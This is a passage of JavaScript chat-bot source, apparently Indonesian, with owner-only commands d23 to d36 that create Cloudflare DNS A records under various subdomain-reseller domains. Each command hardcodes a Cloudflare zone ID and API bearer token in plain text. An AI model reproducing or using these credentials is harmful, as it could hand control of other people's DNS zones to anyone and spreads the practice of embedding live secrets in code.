                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd23': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9b28f4ad0f06b36dd94cc56b01efc19a";
               let apitoken = "bMiZlOhkSzozUq1jMLO5bk4OeZr0GllyVtVWX1F4"
               let tld = "plerkuda.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd24': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2bb49b2de0cbf75c0462ed90d7d333e1";
               let apitoken = "lZ0XMXdnwp2L1DsI3f8frkPwvkQ6ENee2PnAfOsY"
               let tld = "cafegt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd25': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d28c394ba64bf4ecfec1917829d8bced";
               let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB"
               let tld = "shopwebsite.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd26': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "946d5f35d0657cb8bfa442675b37ec42";
               let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1"
               let tld = "sellerpanel-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd27': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4a4818365a74cf535d5b6f16dc62481d";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "ekioffcial.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break      

case  'd28': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "725378afbddffcc9e2c2992ba4232421";
               let apitoken = "MAe0GRPPRxS77oPYXTvImAKNTWit55R63AxuNT1B"
               let tld = "panelku-jasteb.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd29': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "705b7ba658c5f033b91b1b7985f53244";
               let apitoken = "Ucf7fYmbCbDuNDGJ1J3KE8noSS3tgNHRQMxCJZk8"
               let tld = "pannel-pvrt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd30': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "128fe0f8f9f09ecce73e5c34c6a31444";
               let apitoken = "5Mp2HncEE28HzVOpjmvrM_vU1UuWPvGEhhbJ4h6-"
               let tld = "sellerpanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd31': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc4748bba0b75e8273b04c3dea2dc59c";
               let apitoken = "JKZrkLdzdd7hmT9XVcsXpoVsXmWQ61bQN6r2_oq-"
               let tld = "pannelkuu.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break

case  'd32': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3f5d5b68ea37bf7b8a10a9a96b544622";
               let apitoken = "fTKJuqbdce2A-9oeoqhJ9vLfo-EUnLqCCz9OAmKG"
               let tld = "server-smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break   
case  'd33': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0206c68c9b356bdf0a96fbb5d61fbdc";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "my-website.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd34': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80e208bb5900abc50d4483bdb8590d42";
               let apitoken = "3XpwIR878Fi0IoVyaJl1ggGgyJXuy_pB3g0M8pjz"
               let tld = "smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd35': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3d253d788a5ed8fecddba97d3e52cf65";
               let apitoken = "_Y8BhYGmFb_aJEWHml7oQ2j70GPE6raCm_Ud99Yl";
               let tld = "mefahri.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd36': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "583196d8ec9e16fbe5bbe944efbb3d8a";
               let apitoken = "jZ4EuzWs4-ktGcfkwht3NbZfGlZm_VnWjtYyG-1U";
               let tld = "mefahri.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
